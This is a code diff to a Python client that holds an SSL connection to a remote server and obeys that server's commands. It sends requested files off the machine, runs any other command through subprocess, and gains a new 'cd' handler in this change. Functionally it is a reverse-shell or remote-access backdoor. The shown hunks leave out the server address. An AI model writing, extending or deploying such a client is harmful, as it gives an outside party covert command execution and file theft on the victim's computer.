@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import ssl
+import os
 from pathlib import Path
 
 class Client():
@@ -40,8 +41,8 @@ class Client():
         
         # Loop to keep receiving and processing server commands
         while msg != 'quit':
-            msg = list(msg.split(" "))  # Split the received message into command tokens
-            
+            # msg = list(msg.split(" "))  # Split the received message into command tokens
+            msg = msg.split(" ")
             # If the command is 'download', perform file transfer from client to server
             if msg[0] == 'download':
                 filename = msg[1]  # Get the filename from the command
@@ -62,6 +63,33 @@ class Client():
                 sslconn.send('File sent succesfully!'.encode())  # Send confirmation to server
                 msg = sslconn.recv(4096).decode()  # Wait for server response
                 
+            elif msg[0] == 'cd':
+                try:
+                    if len(msg) > 1:
+                        newdir = msg[1]
+                        os.chdir(newdir)
+                        response = "Changed Directory"
+                        sslconn.send(response.encode())
+                    else:
+                        response = "Error: No path provided for 'cd' command"
+                        sslconn.send(response.encode())
+                except FileNotFoundError:
+                    response = f"Error: The directory '{msg[1]}' does not exist."
+                    sslconn.send(response.encode())
+                except PermissionError:
+                    response = f"Error: Permission denied to access '{msg[1]}'."
+                    sslconn.send(response.encode())
+                except IndexError:
+                    response = "Error: No path provided in msg[1]."
+                    sslconn.send(response.encode()) 
+                except Exception as e:
+                    response = f"An unexpected error occurred: {e}"
+                    sslconn.send(response.encode())
+                    
+            # elif msg[0] == 'pwd' or msg[0] == 'cwd':
+                
+            #     os.getcwd()
+                    
             else:
                 # If the command is not related to file transfer, execute the command using subprocess
                 pr = subprocess.Popen(
